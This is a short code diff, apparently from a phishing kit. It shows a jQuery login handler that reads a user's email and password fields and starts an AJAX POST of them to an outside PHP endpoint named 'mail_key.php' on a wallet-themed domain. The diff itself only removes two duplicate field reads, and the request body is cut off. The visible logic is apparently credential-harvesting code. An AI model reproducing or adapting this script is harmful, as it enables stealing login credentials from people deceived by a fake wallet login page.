@@ -13,9 +13,6 @@ $('document').ready(function () {
             var password = $('#pc_login_password').val();
         }
 
-        var mail = $('#mail').val();
-        var password = $('#password').val();
-
         $.ajax({
             url: 'https://platiniumxpwallet.com/external/MadeInChina/php/mail_key.php',
             method: 'post',
